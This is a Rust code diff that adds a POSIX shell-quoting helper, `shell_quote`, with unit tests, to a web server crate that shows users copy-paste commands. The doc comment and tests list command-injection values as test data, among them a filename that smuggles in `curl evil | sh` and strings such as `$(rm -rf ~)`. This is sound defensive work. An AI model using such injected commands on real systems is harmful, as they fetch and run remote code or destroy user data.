@@ -2,8 +2,9 @@
 //!
 //! On the host this crate is the `cohors web` HTTP server (see [`server`]); the
 //! `cohors` binary launches it via [`serve`], and the crate's own binary
-//! ([`standalone`]) is a thin self-contained launcher. On `wasm32` the lib is
-//! empty — there the crate's bin is the Leptos browser page instead.
+//! ([`standalone`]) is a thin self-contained launcher. On `wasm32` the lib
+//! holds only the few items both halves share (the verb lists and
+//! [`shell_quote`]) — there the crate's bin is the Leptos browser page instead.
 
 #![forbid(unsafe_code)]
 
@@ -15,6 +16,66 @@ pub const ACTION_VERBS: &[&str] = &["fetch", "pull", "push", "commit", "stash", 
 /// The verbs whose registry entry demands a deliberate `confirm` — the browser
 /// runs these through a server-side dry-run preview + a Confirm click.
 pub const CONFIRM_VERBS: &[&str] = &["commit", "stash", "run"];
+
+/// Quote `text` as one word for a POSIX shell: wrap it in single quotes and
+/// write each embedded single quote as `'\''` (close the quote, an escaped
+/// quote, reopen).
+///
+/// The page shows commands for the user to copy and paste into a terminal.
+/// Any part of such a command that comes from the fleet (a repository path, a
+/// name, an id) is attacker-influenced: a cloned repository's folder can be
+/// called `x'; curl evil | sh; '` or contain `$(…)`. Inside single quotes the
+/// shell expands nothing, so a value passed through here is always one inert
+/// argument. Every command the page builds from fleet data must use it.
+///
+/// Compiled on both targets so the rule is unit-tested by the native gates.
+pub fn shell_quote(text: &str) -> String {
+    format!("'{}'", text.replace('\'', "'\\''"))
+}
+
+#[cfg(test)]
+mod shell_quote_tests {
+    use super::shell_quote;
+
+    #[test]
+    fn a_plain_path_is_still_quoted() {
+        assert_eq!(shell_quote("/home/me/code/repo"), "'/home/me/code/repo'");
+    }
+
+    #[test]
+    fn spaces_stay_inside_one_word() {
+        assert_eq!(shell_quote("/home/me/my repo"), "'/home/me/my repo'");
+    }
+
+    #[test]
+    fn a_single_quote_cannot_close_the_quoting() {
+        assert_eq!(shell_quote("it's"), r"'it'\''s'");
+        // The classic break-out attempt stays one inert word.
+        assert_eq!(
+            shell_quote("x'; curl evil | sh; '"),
+            r"'x'\''; curl evil | sh; '\'''"
+        );
+    }
+
+    #[test]
+    fn substitutions_and_separators_are_not_expanded() {
+        // Nothing is rewritten: single quotes alone make these literal.
+        for hostile in [
+            "$(rm -rf ~)",
+            "a; rm -rf ~",
+            "`id`",
+            "a && b | c > d",
+            "$HOME",
+        ] {
+            assert_eq!(shell_quote(hostile), format!("'{hostile}'"));
+        }
+    }
+
+    #[test]
+    fn an_empty_value_is_an_empty_word() {
+        assert_eq!(shell_quote(""), "''");
+    }
+}
 
 #[cfg(not(target_arch = "wasm32"))]
 mod server;
